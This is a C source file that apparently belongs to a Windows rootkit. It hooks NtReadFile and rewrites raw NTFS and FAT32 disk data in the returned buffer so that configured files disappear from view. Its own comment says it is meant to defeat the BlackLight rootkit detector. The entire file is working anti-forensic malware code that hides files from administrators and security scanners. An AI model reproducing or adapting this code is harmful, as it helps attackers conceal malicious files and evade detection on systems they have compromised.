#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "ntreadfile.h"
#include "fileraw.h"
#include "config.h"

// compares wchar* with char*
int Ntfsstrnicmp(char* one, WCHAR* two,size_t len)
{
	char* p=one;
	WCHAR* q=two;
	size_t i;
	
	if (wcslen(two)<len) return -1;

	for (i=0;i<len;i++)
	{
		if (_strnicmp(p,(CHAR*)q,1)!=0) return -1;
		(char*)q+=2;p++;
	}

	return 0;
}

// compares char* with char* ignoring '.'
int Fatstrnicmp(char* one,char* two,size_t len)
{
	size_t i;
	char *p=one,*q=two;

	if (strlen(two)<len) return -1;

	for (i=0;i<len;i++)
	{
		if (*p!='.')
		{
			if (_strnicmp(p,q,1)!=0) return -1;
		}
		p++;q++;
	}

	return 0;
}

// searches for hidden file in a buffer (unicode)
LPVOID FindHiddenFileNtfs(LPVOID lpBuffer,ULONG ulLength)
{
	LPVOID p;
	ANSI_STRING asString;
	int i=0;

	while (config_GetOneStringA(ConfigHiddenFileDir,i,&asString))
	{
		p=lpBuffer;
		while ((DWORD)p-(DWORD)lpBuffer<ulLength)
		{
			if (_strnicmp((CHAR*)p,asString.Buffer,1)==0)
			{
				if ((DWORD)p-(DWORD)lpBuffer<ulLength-(asString.Length+1)*2)
				{
					if (Ntfsstrnicmp(asString.Buffer,p,asString.Length)==0)
					{
						RtlFreeAnsiString(&asString);
						return p;
					}
				}
			}
			((char*)p)++;
		}
		RtlFreeAnsiString(&asString);
		i++;
	}
			
	return NULL;
}

// searches for hidden file in a buffer
LPVOID FindHiddenFileFat(LPVOID lpBuffer,ULONG ulLength)
{
	
	LPVOID p;
	ANSI_STRING asString;
	int i=0;

	while (config_GetOneStringA(ConfigHiddenFileDir,i,&asString))
	{
		p=lpBuffer;
		while ((DWORD)p-(DWORD)lpBuffer<ulLength)
		{
			if (_strnicmp((CHAR*)p,asString.Buffer,1)==0)
			{
				if ((DWORD)p-(DWORD)lpBuffer<ulLength-(asString.Length+1))
				{
					if (Fatstrnicmp(asString.Buffer,p,asString.Length)==0)
					{
						RtlFreeAnsiString(&asString);
						return p;
					}
				}
			}
			((char*)p)++;
		}
		RtlFreeAnsiString(&asString);
		i++;
	}

	return NULL;
}

// hide files in raw NTFS/FAT32 data
void FSRawHide(PVOID lpBuffer,DWORD dwLength)
{
	PVOID lpSign;
	PVOID lpPointer;
	PDIRECTORY_INDEX pdiItem;
	PDIRECTORY_INDEX pdiNextItem;
	PFILE_RECORD pfrFile;
	PFAT32_ENTRY pf32FatEntry;
	BOOL bProcessed=FALSE;
	PUCHAR puPointer;

	lpPointer=lpBuffer;
	while (lpSign=FindHiddenFileNtfs(lpPointer,dwLength-((char*)lpPointer-(char*)lpBuffer)))
	{
		// find hidden filename in buffer 
		// NTFS
		// update: there can be more then one record in buffer!

		// next
		lpPointer=(LPVOID)((char*)lpSign+1);
		
		pdiItem=RVATOVA(lpSign,-FIELD_OFFSET(DIRECTORY_INDEX,ie_fname));
		if (pdiItem->ie_flag==0)
		{
			pdiNextItem=RVATOVA(pdiItem,pdiItem->reclen);
			pdiItem->reclen+=pdiNextItem->reclen;
			memcpy(pdiItem->ie_fname,pdiNextItem->ie_fname,pdiNextItem->ie_fnamelen*2);
			pdiItem->ie_fnamelen=pdiNextItem->ie_fnamelen;	
			bProcessed=TRUE;
			lpPointer=(LPVOID)((char*)pdiItem+sizeof(DIRECTORY_INDEX));
		}
		else
		{
			for (puPointer=lpSign;puPointer>=(PUCHAR)lpBuffer;puPointer--)
			{
				if (*(PULONG)puPointer==FILE_SIGN)
				{
					pfrFile=(void*)puPointer;
					pfrFile->fr_fixup.fh_magic=0;
					bProcessed=TRUE;
					lpPointer=(LPVOID)((char*)puPointer+sizeof(FILE_RECORD));
				}
			}
		}
	}
		
	if (!bProcessed)
	{
		// find hidden filename in buffer
		// FAT32

		lpPointer=lpBuffer;
		while (lpSign=FindHiddenFileFat(lpPointer,dwLength-((char*)lpPointer-(char*)lpBuffer)))
		{
			pf32FatEntry=RVATOVA(lpSign,-FIELD_OFFSET(FAT32_ENTRY,strings));
			if (pf32FatEntry->filenumber) pf32FatEntry->strings[0]=0xE5;
			lpPointer=(LPVOID)((char*)lpSign+1);
		}
	}
}

// ntdll.NtReadFile
NTSTATUS WINAPI NewNtReadFile(
  HANDLE           FileHandle,
  HANDLE           Event,
  PIO_APC_ROUTINE  ApcRoutine,
  PVOID            ApcContext,
  PIO_STATUS_BLOCK IoStatusBlock,
  PVOID            Buffer,
  ULONG            Length,
  PLARGE_INTEGER   ByteOffset,
  PULONG           Key
)
{
	NTSTATUS rc;
	WCHAR lpBuffer[(UNICODE_MAX_PATH*2)+UNICODE_NULL];
	ULONG ulResultLen;
	POBJECT_NAME_INFORMATION poni;

	// works for blacklight :)

	// call original function
	rc=OldNtReadFile(
				FileHandle,
				Event,
				ApcRoutine,
				ApcContext,
				IoStatusBlock,
				Buffer,
				Length,
				ByteOffset,
				Key
			);

	if (!NT_SUCCESS(rc))
		return rc;
	
	// zero buffer
	RtlZeroMemory(lpBuffer,(UNICODE_MAX_PATH*2)+UNICODE_NULL);

	// query object name
	NtQueryObject(FileHandle,ObjectNameInformation,&lpBuffer,UNICODE_MAX_PATH*2,&ulResultLen);
	
	poni=(POBJECT_NAME_INFORMATION)lpBuffer;
	if (poni->Name.Buffer)
	{
		// check for \Device\HarddiskVolume...
		if (((wcslen(DISK_DEVICE)+1)*2)==poni->Name.Length)
		{
			if (_wcsnicmp(DISK_DEVICE,poni->Name.Buffer,wcslen(DISK_DEVICE))==0)
			{
				// hide
				FSRawHide(Buffer,IoStatusBlock->uInformation);
			}
		}
	}

	return rc;
}